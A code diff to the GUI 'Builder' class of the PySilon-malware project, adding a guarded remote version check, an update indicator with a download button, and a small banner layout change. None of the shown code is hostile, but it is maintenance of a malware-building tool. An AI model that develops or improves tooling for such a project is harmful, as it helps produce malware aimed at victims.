@@ -18,8 +18,8 @@ class Builder:
         with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
             self.configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))
 
-        self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
-        
+        try: self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
+        except: self.malware_latest_version = None
 
         self.create_navigation()
 
@@ -71,8 +71,27 @@ class Builder:
         self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
         self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
         self.canvas.create_text(0, 460, text='Hover on elements to get more info.', fill='white', font=('Consolas', 10), anchor=tk.SW)
-        
-        self.canvas.create_text(700, 460, text=self.malware_latest_version, fill='white', font=('Consolas', 10), anchor=tk.SE)
+
+ 
+        if self.malware_latest_version == self.configuration['malware_version']:
+            version_indicator = [f'Up to date (v{self.configuration["malware_version"]})', 'green', 700, 460]
+        elif self.malware_latest_version != None:
+            version_indicator = [f'Outdated version (v{self.configuration["malware_version"]}). Latest: v{self.malware_latest_version}', 'gold', 675, 460]
+            self.download_icon = tk.PhotoImage(file='resources/assets/builder_elements/download_icon.png')
+            self.download = tk.Button(
+                self.canvas,
+                image=self.download_icon,
+                disabledforeground='white',
+                relief='flat',
+
+                command=self.open_pysilon_github
+                )
+            self.canvas.create_window(700, 460, window=self.download, anchor=tk.SE)
+        else:
+            version_indicator = ['Couldn\'t determine latest version.', 'red', 700, 460]
+
+
+        self.canvas.create_text(version_indicator[2], version_indicator[3], text=version_indicator[0], fill=version_indicator[1], font=('Consolas', 10), anchor=tk.SE)
 
 
 
@@ -113,8 +132,6 @@ class Builder:
             image=self.banner_image,
             disabledforeground='white',
             relief='flat',
-            width=15,
-            height=15,
             command=self.open_pysilon
             )
         self.banner.place(x=455, y=0, width=245, height=40)
